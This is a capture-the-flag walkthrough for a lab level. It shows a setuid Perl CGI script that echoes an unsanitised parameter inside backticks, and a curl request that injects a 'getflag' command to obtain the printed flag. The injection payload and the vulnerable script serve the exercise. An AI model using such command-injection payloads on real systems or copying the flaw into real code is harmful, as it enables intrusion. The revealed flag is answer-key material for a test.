# Step1
A Perl script is present in home of `level04`

Same as previous level, we can see that the script is running with the owner's permission who is `flag04`

```bash
ls -l
```

### Result
`-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl`


# Step 2

Below is the content of the script

```Perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

So we can curl on it like this:

```bash
curl http://localhost:4747?x=\`getflag\`
```

### Result
The curl cmd above runs ` getflag` as `flag04` user and gives us the flag `ne2searoevaevoem4ov4ar8ap`

No password needed for `flag04`
